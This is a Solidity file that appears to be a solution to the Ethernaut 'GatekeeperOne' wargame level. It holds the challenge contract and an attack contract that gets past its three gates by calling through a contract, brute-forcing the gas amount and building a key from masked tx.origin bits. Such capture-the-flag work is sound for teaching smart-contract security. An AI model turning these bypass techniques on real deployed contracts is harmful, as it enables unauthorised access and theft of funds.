// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneAttack {
  GatekeeperOne public _target;

  constructor(address targetAddress) {
      _target = GatekeeperOne(targetAddress);
  }
  function attack() external {
    bytes8 gatekey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    for(uint256 extra = 300; extra > 0; extra --){
      (bool sucess, ) = address(_target).call{gas: extra + (8191 *3)}(abi.encodeWithSignature("enter(bytes8)"	,gatekey));
      if(sucess){
        break;
      }
    }
  }
}